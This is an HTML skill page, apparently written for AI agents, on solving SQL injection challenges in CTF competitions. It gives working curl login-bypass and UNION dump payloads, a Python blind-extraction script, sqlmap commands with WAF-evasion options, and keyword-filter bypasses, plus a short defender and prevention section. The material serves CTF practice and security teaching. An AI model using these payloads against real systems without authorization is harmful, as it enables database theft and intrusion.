@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: ctf-web-challenges-sqli-challenges</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>ctf-web-challenges-sqli-challenges</h2><div class="meta"><span class="badge gray">ctf</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when a CTF web challenge involves SQL injection, whether</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="ctf-web-challenges.html">ctf-web-challenges</a></div><div class="deps"><span class="kind">requires:</span> <a href="ctf-web-challenges.html">ctf-web-challenges</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="web-sqli.html">web-sqli</a> <a href="ctf-web-challenges.html">ctf-web-challenges</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>sqlmap</td><td>1.9.2</td></tr><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>Python</td><td>3.12</td></tr><tr><td>curl</td><td>8.5</td></tr></tbody></table><p>SQL injection in CTFs is usually a sprint, not a marathon: login bypasses, UNION dumps of a <code>flags</code> table, and the occasional blind extraction. This sub-skill covers the authorized CTF-focused methodology: the fastest payloads first, source-driven query reconstruction, sqlmap for speed, and manual blind techniques when automation is filtered. Scope is CTF competitions, lab apps, and systems you have explicit permission to test.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>If source is provided, read the query construction first; knowing</li>
+<p>the exact query beats blind probing.</p>
+<li>Try login bypass payloads on auth forms (fastest win in the</li>
+<p>category).</p>
+<li>Probe URL parameters and search boxes with <code>&#x27;</code>, <code>&quot;</code>, and boolean</li>
+<p>pairs to find injectable points.</p>
+<li>Determine column count (<code>ORDER BY</code>) and visible columns (UNION</li>
+<p>SELECT 1,2,3...) when output is reflected.</p>
+<li>Enumerate <code>information_schema</code> (or sqlite_master) to find the flag</li>
+<p>table, then dump it.</p>
+<li>If nothing reflects, switch to boolean blind with a Python loop, or</li>
+<p>time-based if the page never changes.</p>
+<li>Run sqlmap in parallel on confirmed points to automate enumeration.</li>
+<li>Copy the flag, verify its format, and move on; do not over-extract.</li>
+</ol>
+<h2>1. Login bypass payload ladder</h2>
+<p>Try in order; stop at the first that works.</p>
+<pre><code class="language-bash">BASE=&quot;http://chals.ctf:8000/login&quot;
+# Classic tautologies
+curl -s -X POST $BASE -d &quot;username=admin&#x27;--&amp;password=x&quot; | grep -i -c &quot;welcome\|dashboard\|flag&quot;
+curl -s -X POST $BASE -d &quot;username=admin&#x27; OR &#x27;1&#x27;=&#x27;1&#x27;--&amp;password=x&quot; | grep -i -c &quot;welcome&quot;
+curl -s -X POST $BASE -d &quot;username=&#x27; OR 1=1--&amp;password=&#x27; OR 1=1--&quot; | grep -i -c &quot;welcome&quot;
+# NoSQL-flavored apps are a different bug class; confirm SQL from source or errors first</code></pre>
+<p>Read the response, not just the status: a bypass often changes page content (a dashboard, a flag string) without changing the HTTP code. When source shows the query, tailor the comment syntax: MySQL needs <code>-- </code> (with space) or <code>#</code>, and the trailing content must be neutralized exactly.</p>
+<h2>2. UNION extraction of the flag table</h2>
+<pre><code class="language-bash">U=&quot;http://chals.ctf:8000/item?id=1&quot;
+
+# Column count: raise n until the page breaks
+for n in 1 2 3 4 5 6; do
+  echo -n &quot;$n: &quot;
+  curl -s -o /dev/null -w &#x27;%{http_code}\n&#x27; &quot;$U&#x27;+ORDER+BY+$n--+-&quot;
+done
+
+# Visible columns (example: 3 columns, column 2 renders)
+curl -s &quot;$U&#x27;+UNION+SELECT+1,2,3--+-&quot; | grep -o &quot;2&quot;
+
+# Find tables, then the flag table&#x27;s columns, then dump
+curl -s &quot;$U&#x27;+UNION+SELECT+1,group_concat(table_name),3+FROM+information_schema.tables+WHERE+table_schema=database()--+-&quot;
+curl -s &quot;$U&#x27;+UNION+SELECT+1,group_concat(column_name),3+FROM+information_schema.columns+WHERE+table_name=&#x27;flags&#x27;--+-&quot;
+curl -s &quot;$U&#x27;+UNION+SELECT+1,flag,3+FROM+flags--+-&quot; | grep -o -E &quot;flag\{[^}]+\}&quot;</code></pre>
+<p>SQLite variant (common in small CTF apps): replace <code>information_schema.tables</code> with <code>sqlite_master</code>, and <code>group_concat(table_name)</code> with <code>group_concat(name)</code>:</p>
+<pre><code class="language-bash">curl -s &quot;$U&#x27;+UNION+SELECT+1,group_concat(name),3+FROM+sqlite_master--+-&quot;
+curl -s &quot;$U&#x27;+UNION+SELECT+1,sql,3+FROM+sqlite_master+WHERE+name=&#x27;flags&#x27;--+-&quot;</code></pre>
+<h2>3. Blind extraction scripts</h2>
+<p>When the app gives no reflected output, extract character by character.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+&quot;&quot;&quot;Boolean-blind flag extractor for CTF SQLi.&quot;&quot;&quot;
+import requests
+
+URL = &quot;http://chals.ctf:8000/item&quot;
+TRUE = &quot;in stock&quot;          # text present only when the condition is true
+ALPHA = &quot;abcdefghijklmnopqrstuvwxyz0123456789_{}-! &quot;
+
+def ask(cond):
+    r = requests.get(URL, params={&quot;id&quot;: f&quot;1 AND ({cond})-- -&quot;}, timeout=10)
+    return TRUE in r.text
+
+# binary search per character is faster; linear is shown for clarity
+flag = &quot;&quot;
+for pos in range(1, 64):
+    for c in ALPHA:
+        if ask(f&quot;SUBSTRING((SELECT flag FROM flags LIMIT 1),{pos},1)=&#x27;{c}&#x27;&quot;):
+            flag += c
+            print(flag, flush=True)
+            break
+    else:
+        break
+print(&quot;FLAG:&quot;, flag)</code></pre>
+<p>Time-based variant: replace the condition with <code>IF(&lt;cond&gt;,SLEEP(2),0)</code> and measure <code>r.elapsed.total_seconds() &gt; 1.5</code>. Keep the alphabet small (flag charset first) and use binary search on <code>ASCII(SUBSTRING(...))</code> to cut requests roughly 5x.</p>
+<h2>4. sqlmap for CTF speed</h2>
+<pre><code class="language-bash"># GET parameter, full auto
+sqlmap -u &quot;http://chals.ctf:8000/item?id=1&quot; --batch --dbs
+
+# POST login form: capture via Burp, save request file
+sqlmap -r /tmp/login.req --batch --dump -D ctfdb -T flags
+
+# Direct flag grab once the table is known
+sqlmap -u &quot;http://chals.ctf:8000/item?id=1&quot; --batch -D ctfdb -T flags --dump
+
+# Filtered target: tamper scripts and lower noise
+sqlmap -u &quot;http://chals.ctf:8000/item?id=1&quot; --batch \
+  --tamper=space2comment,randomcase --delay=1 --threads=1</code></pre>
+<p>In CTFs, run sqlmap in the background while you manually probe the next parameter; the parallel approach wins time. Always <code>--batch</code> so it never blocks on a prompt mid-competition.</p>
+<h2>5. Filter bypass tricks</h2>
+<p>CTF authors filter keywords to force creativity. Bypass patterns:</p>
+<ul>
+<li>Case variation: <code>UnIoN SeLeCt</code> (when the filter is case-sensitive).</li>
+<li>Inline comments: <code>/**/</code> for spaces, <code>/*!50000SELECT*/</code> (MySQL</li>
+<p>versioned comments execute the keyword).</p>
+<li>Double keywords: <code>UNUNIONION</code> (filter strips <code>UNION</code> once, leaving</li>
+<p><code>UNION</code>).</p>
+<li>Alternative encodings: URL-encode, double-URL-encode for layered</li>
+<p>decoding.</p>
+<li>No commas: use <code>JOIN</code> or offset-based <code>LIMIT 1 OFFSET n</code> instead of</li>
+<p><code>LIMIT 1,1</code>; use <code>FROM</code> with subqueries.</p>
+<li>No spaces: <code>/**/</code> , tabs <code>%09</code>, newlines <code>%0a</code>.</li>
+</ul>
+<p>Read the filter from source when it is provided; a precise bypass beats ten guesses.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>The query is in an <code>INSERT</code> or <code>UPDATE</code> (second-order): inject at</li>
+<p>registration, then trigger the SELECT that reads your stored value (profile page, admin panel).</p>
+<li>Stacked queries work (<code>;</code> allowed): <code>&#x27;; DROP TABLE</code> is never the</li>
+<p>CTF path; use <code>&#x27;; SELECT ...</code> only if the driver returns the second result, which most web drivers do not.</p>
+<li>The flag column is named unexpectedly (<code>secret</code>, <code>value</code>, <code>data</code>):</li>
+<p>dump <code>information_schema.columns</code> fully instead of guessing names.</p>
+<li>WAF blocks sqlmap&#x27;s default user agent: <code>--random-agent</code> or replay</li>
+<p>through Burp with a browser UA.</p>
+<li>The app uses prepared statements everywhere except one admin</li>
+<p>endpoint: that one endpoint is the challenge; find it via source or route fuzzing.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>UNION fails on type mismatch: cast with <code>CAST(... AS CHAR)</code> or put</li>
+<p><code>NULL</code> in non-matching columns, and recheck the count.</p>
+<li>Blind extraction is too slow for the competition clock: narrow the</li>
+<p>charset to the flag format, binary-search each byte, and parallelize positions with threads (respect the challenge infra).</p>
+<li>sqlmap says &quot;not injectable&quot; but manual probes differ: save the exact</li>
+<p>manual request to a file and run <code>sqlmap -r</code> on it; heuristic differences usually come from headers or cookies.</p>
+<li>The database is PostgreSQL: switch to <code>pg_sleep</code>, <code>string_agg</code>, and</li>
+<p><code>information_schema</code> (same names, different functions); fingerprint with <code>version()</code> output first.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see CTF-style SQLi as bursts of requests with quotes, <code>UNION</code>, <code>information_schema</code>, and <code>SLEEP</code> in parameters, plus sqlmap&#x27;s default user agent and its distinctive payload ordering. Even in authorized tests, keep request rates sane on shared infrastructure. The fixes are the classic ones: parameterized queries, least-privilege DB users, and generic error pages. For CTF authors: filters make challenges more interesting but never rely on them as the only defense in real apps.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1190 (Exploit Public-Facing Application).</li>
+<li>CWE-89 (Improper Neutralization of Special Elements used in an SQL</li>
+<p>Command, SQL Injection).</p>
+<li>sqlmap 1.9.2 usage: https://sqlmap.org/usage/</li>
+<li>PortSwigger SQL injection cheat sheet: https://portswigger.net/web-security/sql-injection/cheat-sheet</li>
+<li>OWASP SQL Injection Prevention Cheat Sheet:</li>
+<p>https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html</p>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
